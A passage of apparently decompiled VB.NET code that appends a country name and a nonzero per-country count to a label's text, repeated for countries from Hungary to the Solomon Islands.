            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Hungary : ", Main.Hungary)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Iceland, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Iceland : ", Main.Iceland)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.India, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "India : ", Main.India)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Indonesia, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Indonesia : ", Main.Indonesia)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.IslamicRepublicofIran, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Islamic Republic of Iran : ", Main.IslamicRepublicofIran)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Iraq, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Iraq : ", Main.Iraq)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Ireland, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Ireland : ", Main.Ireland)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.PalestinianTerritory, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Palestinian Territory , Occupied : ", Main.PalestinianTerritory)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Italy, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Italy : ", Main.Italy)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Jamaica, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Jamaica : ", Main.Jamaica)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Japan, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Japan : ", Main.Japan)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Jordan, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Jordan : ", Main.Jordan)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Kazakhstan, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Kazakhstan : ", Main.Kazakhstan)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Kenya, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Kenya : ", Main.Kenya)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Kiribati, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Kiribati : ", Main.Kiribati)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.NorthKorea, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "North Korea : ", Main.NorthKorea)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.SouthKorea, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "South Korea : ", Main.SouthKorea)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Kuwait, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Kuwait : ", Main.Kuwait)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Kyrgyzstan, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Kyrgyzstan : ", Main.Kyrgyzstan)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.LaoPeoplesDemocraticRepublic, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Lao People's Democratic Republic : ", Main.LaoPeoplesDemocraticRepublic)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Latvia, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Latvia : ", Main.Latvia)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Lebanon, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Lebanon : ", Main.Lebanon)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Lesotho, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Lesotho : ", Main.Lesotho)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Liberia, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Liberia : ", Main.Liberia)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Libya, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Libyan Arab Jamahiriya : ", Main.Libya)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Liechtenstein, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Liechtenstein : ", Main.Liechtenstein)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Lithuania, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Lithuania : ", Main.Lithuania)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Luxembourg, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Luxembourg : ", Main.Luxembourg)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Macao, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Macao : ", Main.Macao)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.RepublicofMacedonia, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Republic of Macedonia : ", Main.RepublicofMacedonia)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Madagascar, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Madagascar : ", Main.Madagascar)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Malawi, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Malawi : ", Main.Malawi)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Malaysia, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Malaysia : ", Main.Malaysia)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Maldives, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Maldives : ", Main.Maldives)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Mali, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Mali : ", Main.Mali)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Malta, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Malta : ", Main.Malta)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.MarshallIslands, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Marshall Islands : ", Main.MarshallIslands)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Martinique, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Martinique : ", Main.Martinique)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Mauritania, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Mauritania : ", Main.Mauritania)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Mauritius, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Mauritius : ", Main.Mauritius)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Mayotte, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Mayotte : ", Main.Mayotte)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Mexico, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Mexico : ", Main.Mexico)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.FederatedStatesofMicronesia, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Federated States of Micronesia : ", Main.FederatedStatesofMicronesia)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.RepublicofMoldova, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Republic of Moldova : ", Main.RepublicofMoldova)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.PrincipalityofMonaco, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Principality of Monaco : ", Main.PrincipalityofMonaco)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Mongolia, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Mongolia : ", Main.Mongolia)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Montenegro, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Montenegro : ", Main.Montenegro)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Montserrat, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Montserrat : ", Main.Montserrat)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Morocco, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Morocco : ", Main.Morocco)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Mozambique, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Mozambique : ", Main.Mozambique)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Myanmar, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Myanmar : ", Main.Myanmar)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Namibia, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Namibia : ", Main.Namibia)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Nauru, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Nauru : ", Main.Nauru)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Nepal, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Nepal : ", Main.Nepal)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.NetherlandsAntilles, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Netherlands Antilles : ", Main.NetherlandsAntilles)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Netherlands, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Netherlands : ", Main.Netherlands)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.NewCaledonia, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "New Caledonia : ", Main.NewCaledonia)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.NewZealand, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "New Zealand : ", Main.NewZealand)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Nicaragua, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Nicaragua : ", Main.Nicaragua)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Niger, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Niger : ", Main.Niger)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Nigeria, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Nigeria : ", Main.Nigeria)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Niue, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Niue : ", Main.Niue)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.NorfolkIsland, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Norfolk Island : ", Main.NorfolkIsland)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.NorthernMarianaIslands, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Northern Mariana Islands : ", Main.NorthernMarianaIslands)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Norway, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Norway : ", Main.Norway)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.SultanateofOman, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Sultanate of Oman : ", Main.SultanateofOman)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.IslamicRepublicofPakistan, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Islamic Republic of Pakistan : ", Main.IslamicRepublicofPakistan)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Palau, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Palau : ", Main.Palau)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Panama, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Panama : ", Main.Panama)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.PapuaNewGuinea, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Papua New Guinea : ", Main.PapuaNewGuinea)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Paraguay, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Paraguay : ", Main.Paraguay)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Peru, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Peru : ", Main.Peru)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Philippines, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Philippines : ", Main.Philippines)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.PitcairnIslands, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Pitcairn Islands : ", Main.PitcairnIslands)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Poland, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Poland : ", Main.Poland)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Portugal, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Portugal : ", Main.Portugal)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Palestine, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Palestine : ", Main.Palestine)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.PuertoRico, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Puerto Rico : ", Main.PuertoRico)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Qatar, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Qatar : ", Main.Qatar)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Reunion, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Reunion : ", Main.Reunion)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Romania, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Romania : ", Main.Romania)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Serbia, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Serbia : ", Main.Serbia)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Russia, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Russia : ", Main.Russia)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Rwanda, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Rwanda : ", Main.Rwanda)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.SaintHelena, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Saint Helena : ", Main.SaintHelena)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.SaintKittsandNevis, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Saint Kitts and Nevis : ", Main.SaintKittsandNevis)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.SaintLucia, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Saint Lucia : ", Main.SaintLucia)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.SaintPierreandMiquelon, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Saint Pierre and Miquelon : ", Main.SaintPierreandMiquelon)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.SaintVincentandtheGrenadines, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Saint Vincent and the Grenadines : ", Main.SaintVincentandtheGrenadines)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Samoa, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Samoa : ", Main.Samoa)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.SanMarino, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "San Marino : ", Main.SanMarino)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.SaoTomeandPrincipe, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Sao Tome and Principe : ", Main.SaoTomeandPrincipe)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.SaudiArabia, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Saudi Arabia : ", Main.SaudiArabia)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Scotland, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Scotland : ", Main.Scotland)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Senegal, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Senegal : ", Main.Senegal)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Seychelles, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Seychelles : ", Main.Seychelles)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.SierraLeone, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Sierra Leone : ", Main.SierraLeone)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Singapore, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Singapore : ", Main.Singapore)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Slovakia, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Slovakia : ", Main.Slovakia)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.Slovenia, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Slovenia : ", Main.Slovenia)))
        End If
        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Main.SolomonIslands, 0, False))) Then
            label = Me.Label4
            label.Text = Conversions.ToString(Operators.AddObject(label.Text, Operators.ConcatenateObject(ChrW(13) & ChrW(10) & "Solomon Islands : ", Main.SolomonIslands)))
        End If
